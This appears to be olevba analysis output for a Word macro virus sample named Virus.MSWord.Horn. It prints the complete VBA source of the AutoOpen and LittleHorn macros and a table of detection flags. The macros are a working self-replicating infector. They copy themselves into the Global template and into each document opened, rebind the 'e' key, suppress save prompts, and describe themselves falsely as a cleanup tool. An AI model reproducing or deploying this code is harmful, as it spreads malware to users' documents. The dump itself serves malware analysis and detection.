olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Horn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Horn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Horn - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Run this macro to scan and clean up any documents or templates that may contain the prank macros."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim Already
Dim i
On Error Resume Next
Already = 0
For i = 1 To WordBasic.CountMacros(0, 0)
If WordBasic.[MacroName$](i, 0, 0) = "LittleHorn" Then Already = 1
Next
If Already = 0 Then
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":LittleHorn", "Global:LittleHorn"
WordBasic.ToolsCustomizeKeyboard ResetAll:=1, Context:=0
WordBasic.ToolsCustomizeKeyboard KeyCode:=69, Category:=2, Name:="LittleHorn", Add:=1, Context:=0
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO LittleHorn.bas 
in file: ./Virus.MSWord.Horn - OLE stream: 'Macros/VBA/LittleHorn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "LITTLE HORN!!"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.LittleHorn.MAIN"
Dim Already
Dim i
On Error Resume Next
Already = 0
For i = 1 To WordBasic.CountMacros(1, 0)
If WordBasic.[MacroName$](i, 1, 0) = "LittleHorn" Then Already = 1
Next
If Already = 0 And WordBasic.[FileName$]() <> "Document1" Then
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:LittleHorn", WordBasic.[FileName$]() + ":LittleHorn"
WordBasic.FileSaveAs Format:=1
End If
WordBasic.Insert "e"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

